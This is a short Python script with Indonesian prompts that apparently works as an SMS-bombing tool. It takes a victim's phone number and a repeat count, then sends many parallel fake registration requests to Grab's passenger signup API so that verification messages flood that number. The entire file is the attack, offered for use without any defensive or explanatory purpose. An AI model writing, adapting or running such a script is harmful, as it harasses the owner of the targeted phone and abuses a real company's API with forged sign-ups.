from multiprocessing.pool import ThreadPool
try:
	import os, random
	from time import sleep as turu
	import subprocess as sp
	import requests
except ModuleNotFoundError:	
	print("\n install requests\n")
	exit()

try:
	os.system('clear')
	print("##################################")
	print("Creator @Mr.Ti")
	hape = input("Nomer hp ")
	total=int(input("Delay ne Bro "))
except KeyboardInterrupt:
	print("\nKey interrupt")
	exit()
print()
print("#Directed Mr.Ti")
def main(arg):
	try:
		nomerewong=('phoneNumber')
		kirim = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':hape, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#		print(r.text)
		if str(nomerewong) in str(kirim.text):
			print(" [][][][][][][][][][][]:: Terkirim bos ku ::[][][][][][][][][][][]")
		else:
			print(" [][][][][][][][][][][]:: EROR bos ku ::[][][][][][][][][][][]")
	except: pass

jobs = []
for x in range(total):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("Bubar bubar")